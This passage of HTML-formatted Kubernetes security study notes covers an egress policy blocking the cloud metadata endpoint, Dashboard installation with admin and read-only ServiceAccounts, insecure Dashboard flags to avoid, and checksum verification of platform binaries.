+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;networking.k8s.io/v1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;NetworkPolicy&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;default-deny-egress-metadata-server&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;namespace&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;a12&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;spec&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;podSelector&lt;/span&gt;: {}
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;policyTypes&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#ae81ff&#34;&gt;Egress&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;egress&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#f92672&#34;&gt;to&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    - &lt;span style=&#34;color:#f92672&#34;&gt;ipBlock&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;cidr&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;0.0.0.0&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;/0&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#f92672&#34;&gt;except&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        - &lt;span style=&#34;color:#ae81ff&#34;&gt;169.254.169.254&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;/32&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once the network policy has been created, Pods in the namespace a12 should not be able to reach the metadata endpoints anymore.&lt;/p&gt;
+&lt;h2 id=&#34;protecting-gui-elements&#34;&gt;Protecting GUI Elements&lt;/h2&gt;
+&lt;p&gt;The kubectl tool isn’t the only user interface (UI) for managing a cluster. While kubectl allows for fine-grained operations, most organizations prefer a more convenient graphical user interface (GUI) for managing the objects of a cluster. You can choose from a variety of options. The Kubernetes &lt;em&gt;Dashboard&lt;/em&gt; is a free, web-based application.&lt;/p&gt;
+&lt;p&gt;Other GUI dashboards for Kubernetes like &lt;em&gt;Portainer&lt;/em&gt; go beyond the basic functionality by adding tracing of events or visualizations of hardware resource consumption. In this section, we’ll focus on the Kubernetes Dashboard as it is easy to install and configure.&lt;/p&gt;
+&lt;p&gt;The Kubernetes Dashboard runs as a Pod inside of the cluster.&lt;/p&gt;
+&lt;p&gt;In order to install Kubernetes Dashboard simply run:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Add kubernetes-dashboard repository&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;helm repo add kubernetes-dashboard https://kubernetes.github.io/dashboard/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# Deploy a Helm Release named &amp;#34;kubernetes-dashboard&amp;#34; using the kubernetes-dashboard chart&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;helm upgrade --install kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard --create-namespace --namespace kubernetes-dashboard
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl get deployments,pods,services -n kubernetes-dashboard
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 140834.png]]&lt;/p&gt;
+&lt;p&gt;As we can see, kong-proxy type in &lt;em&gt;ClusterIP&lt;/em&gt;, which means we can&amp;rsquo;t access it outside the cluster, it needs to be type of &lt;em&gt;NodePort&lt;/em&gt; and we need to enable http communication so that we can access it via the browser.&lt;/p&gt;
+&lt;p&gt;Create values.yaml:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kong&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;proxy&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;type&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;NodePort&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;http&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;enabled&lt;/span&gt;: &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;helm upgrade kubernetes-dashboard kubernetes-dashboard/kubernetes-dashboard -f values.yaml --namespace kubernetes-dashboard  
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 152814.png]]&lt;/p&gt;
+&lt;p&gt;To access Dashboard run:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl -n kubernetes-dashboard port-forward svc/kubernetes-dashboard-kong-proxy 8443:443
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Forwarding from 127.0.0.1:8443 -&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8443&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Forwarding from &lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;::1&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;:8443 -&amp;gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8443&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Now go to &lt;code&gt;https://localhost:8443&lt;/code&gt; and it will ask you to prompt the bearer token.&lt;/p&gt;
+&lt;p&gt;![[Capture d’écran 2024-08-18 153040.png]]&lt;/p&gt;
+&lt;h3 id=&#34;creating-a-user-with-administration-privileges&#34;&gt;Creating a User with Administration Privileges&lt;/h3&gt;
+&lt;p&gt;Before you can authenticate in the login screen, you need to create a ServiceAccount and ClusterRoleBinding object that grant admin permissions. Start by creating the file admin-user-serviceaccount.yaml .&lt;/p&gt;
+&lt;p&gt;![[Capture d’écran 2024-08-18 144426.png]]&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl create -f admin-user-serviceaccount.yaml
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl create -f admin-user-clusterrole&lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;binding.yaml
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;You can now create the bearer token of the admin user with the following command. The command will generate a token for the provided ServiceAccount object and render it on the console.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl create token admin-user -n kubernetes-dashboard
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 223627.png]]&lt;/p&gt;
+&lt;p&gt;Go to the Dashboard and feed it the token to access.&lt;/p&gt;
+&lt;p&gt;![[Capture d’écran 2024-08-18 153249.png]]&lt;/p&gt;
+&lt;h3 id=&#34;creating-a-user-with-restricted-privileges&#34;&gt;Creating a User with Restricted Privileges&lt;/h3&gt;
+&lt;p&gt;In the previous section, you learned how to create a user with cluster-wide admin‐ istrative permissions. Most users of the Dashboard only need a restricted set of per‐ missions, though. For example, developers implementing and operating cloud-native applications will likely only need a subset of administrative permissions to perform their tasks on a Kubernetes cluster.&lt;/p&gt;
+&lt;p&gt;Creating a user for the Dashboard with restricted privileges consists of a three-step approach:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;Create a ServiceAccount object.&lt;/li&gt;
+&lt;li&gt;Create a ClusterRole object that defines the permissions.&lt;/li&gt;
+&lt;li&gt;Create a ClusterRoleBinding that maps the ClusterRole to the ServiceAccount.&lt;/li&gt;
+&lt;/ol&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-yml&#34; data-lang=&#34;yml&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;v1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;ServiceAccount&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;developer-user&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;namespace&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;kubernetes-dashboard&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;---
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;rbac.authorization.k8s.io/v1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;ClusterRole&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;annotations&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;rbac.authorization.kubernetes.io/autoupdate&lt;/span&gt;: &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;true&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;cluster-developer&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;rules&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- &lt;span style=&#34;color:#f92672&#34;&gt;apiGroups&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;*&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;resources&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;*&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;verbs&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#ae81ff&#34;&gt;get&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#ae81ff&#34;&gt;list&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#ae81ff&#34;&gt;watch&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- &lt;span style=&#34;color:#f92672&#34;&gt;nonResourceURLs&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;*&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;verbs&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#ae81ff&#34;&gt;get&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#ae81ff&#34;&gt;list&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  - &lt;span style=&#34;color:#ae81ff&#34;&gt;watch&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;---
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;apiVersion&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;rbac.authorization.k8s.io/v1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;ClusterRoleBinding&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;metadata&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;developer-user&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;roleRef&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;apiGroup&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;rbac.authorization.k8s.io&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;ClusterRole&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;cluster-developer&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;subjects&lt;/span&gt;:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;- &lt;span style=&#34;color:#f92672&#34;&gt;kind&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;ServiceAccount&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;name&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;developer-user&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;namespace&lt;/span&gt;: &lt;span style=&#34;color:#ae81ff&#34;&gt;kubernetes-dashboard&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubectl create token developer-user -n kubernetes-dashboard
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;![[Capture d’écran 2024-08-18 223352.png]]&lt;/p&gt;
+&lt;p&gt;Developer user cannot delete a pod, let&amp;rsquo;s try;&lt;/p&gt;
+&lt;p&gt;![[Capture d’écran 2024-08-18 155914.png]]&lt;/p&gt;
+&lt;p&gt;An error message rendered when trying to invoke a permitted operation.&lt;/p&gt;
+&lt;h3 id=&#34;avoiding-insecure-configuration-arguments&#34;&gt;Avoiding Insecure Configuration Arguments&lt;/h3&gt;
+&lt;p&gt;Securing the Dashboard in production environments involves the usage of execution arguments necessary for properly configuring authentication and authorization. By default, login functionality is enabled and the HTTPS endpoint will be exposed on port 8443. You can provide TLS certificates with the &amp;ndash;tls-cert-file and &amp;ndash;tlscert-key command line options if you don’t want them to be auto-generated.&lt;/p&gt;
+&lt;p&gt;Avoid setting the command line arguments &amp;ndash;insecure-port to expose an HTTP endpoint and &amp;ndash;enable-insecure-login to enable serving the login page over HTTP instead of HTTPS. Furthermore, make sure you don’t use the option &amp;ndash;enable-skip-login as it would allow circumventing an authentication method by simply clicking a Skip button in the login screen.&lt;/p&gt;
+&lt;h2 id=&#34;verifying-kubernetes-platform-binaries&#34;&gt;Verifying Kubernetes Platform Binaries&lt;/h2&gt;
+&lt;p&gt;The Kubernetes project publishes client and server binaries with every release&lt;/p&gt;
+&lt;p&gt;The executables kubectl and kubeadm are essential for interacting with Kubernetes. kubectl lets you run commands against the API server.&lt;/p&gt;
+&lt;p&gt;Know how to detect modified platform binaries&lt;/p&gt;
+&lt;p&gt;Platform binaries like kubectl and kubeadm can be verified against their corresponding hash code. Know where to find the hash file and how to use a validation tool to identify if the binary has been tempered with.&lt;/p&gt;
+&lt;p&gt;You can download the corresponding hash code for a binary from &lt;a href=&#34;https://dl.k8s.io&#34;&gt;https://dl.k8s.io&lt;/a&gt;. The full URL for a hash code reflects the version, operating system, and architecture of the binary. The following list shows example URLs for platform binaries compati‐ ble with Linux AMD64:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;kubectl: &lt;a href=&#34;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kubectl.sha256&#34;&gt;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kubectl.sha256&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;kubeadm: &lt;a href=&#34;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kubeadm.sha256&#34;&gt;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kubeadm.sha256&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;kubelet: &lt;a href=&#34;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kubelet.sha256&#34;&gt;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kubelet.sha256&lt;/a&gt;&lt;/li&gt;
+&lt;li&gt;kube-apiserver: &lt;a href=&#34;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kube-apiserver.sha256&#34;&gt;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kube-apiserver.sha256&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The following commands demonstrate downloading the kubeadm binary for version 1.26.1 and its corresponding SHA256 hash file:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -LO &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kubeadm&amp;#34;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -LO &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;https://dl.k8s.io/v1.26.1/bin/linux/amd64/kubeadm.sha256&amp;#34;&lt;/span&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The validation tool shasum can verify if the checksum matches:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;cat kubeadm.sha256&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; kubeadm&amp;#34;&lt;/span&gt; | shasum -a &lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt; --check 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;kubeadm: OK 
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;The previous command returned with an “OK” message. The binary file wasn’t tampered with. Any other message indicates a potential security risk when executing the binary&lt;/p&gt;
+&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;
+&lt;p&gt;![[Capture d’écran 2024-08-18 130827.png]]&lt;/p&gt;
+&lt;h4 id=&#34;understand-the-purpose-and-effects-of-network-policies&#34;&gt;Understand the Purpose and Effects of Network Policies&lt;/h4&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;Default Behavior&lt;/strong&gt;: By default, Pod-to-Pod communication is unrestricted.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Default Deny Rule&lt;/strong&gt;: Instantiate a default deny rule to restrict Pod-to-Pod network traffic, applying the principle of least privilege.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Network Policy Attributes&lt;/strong&gt;:
+&lt;ul&gt;
+&lt;li&gt;&lt;strong&gt;&lt;code&gt;spec.podSelector&lt;/code&gt;&lt;/strong&gt;: Selects the target Pod for the rules based on label selection.&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Ingress and Egress Rules&lt;/strong&gt;: Define Pods, namespaces, IP addresses, and ports for allowing incoming and outgoing traffic.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li&gt;&lt;strong&gt;Aggregation of Policies&lt;/strong&gt;: Network policies can be aggregated. A default deny rule may disallow ingress and/or egress traffic. Additional policies can open up those rules with more fine-grained definitions.&lt;/li&gt;
+&lt;/ul&gt;
